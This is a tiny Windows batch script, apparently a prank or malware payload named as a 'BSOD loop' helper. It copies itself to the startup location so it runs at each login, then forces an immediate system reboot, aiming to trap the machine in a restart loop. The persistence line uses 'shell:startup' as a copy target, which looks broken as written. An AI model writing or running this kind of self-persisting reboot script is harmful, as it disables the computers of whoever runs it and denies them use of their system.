@echo off
copy "Windows 10 bsod loop assist.bat" "shell:startup"
wmic os where primary=1 reboot
